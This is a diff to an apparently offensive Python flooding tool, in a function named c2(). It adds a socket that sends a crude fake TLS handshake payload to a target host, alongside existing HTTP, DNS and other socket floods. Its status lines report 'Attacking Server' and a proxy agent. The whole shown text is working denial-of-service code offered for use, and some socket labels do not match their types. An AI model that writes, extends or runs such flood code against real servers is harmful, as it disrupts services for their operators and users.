@@ -65,6 +65,7 @@ def c2():
     syn = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     icmp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     dnsf = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    tls = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     try:
         http.connect((ip,port))
         http.sendto(("GET / HTTP/1.1\r\n").encode('utf-8'), (ip,port))
@@ -105,6 +106,15 @@ def c2():
         dnsf.connect((ip,port))
         dnsf.send(dns.encode('utf-8'))
         dnsf.close()
+        tls.connect((ip,port))
+        tls_temp = b'Client GET'
+        tls_temp += b'\x03\x03'
+        tls_temp += b'\x00\x00\x00\x00\x00\x00\x00\x00'
+        tls_temp += b'\x00\x00\x00\x00\x00\x00\x00\x00'
+        tls_temp += b'\x00\x00\x00\x00\x00\x00\x00\x00'
+        tls_temp += b'\x01\x00\x00\x00\x00\x00\x00\x00'
+        tls.sendall(tls_temp)
+        tls.close()
         print(f"Attacking Server {ip}:{port} Sent: ", i, "Status : Fine            ", f"Proxy-Agent : {fip}", end='\r')
     except TimeoutError:
         print(f"Attacking Server {ip}:{port} Sent: ", i, "Status : Down            ", f"Proxy-Agent : {fip}", end='\r')
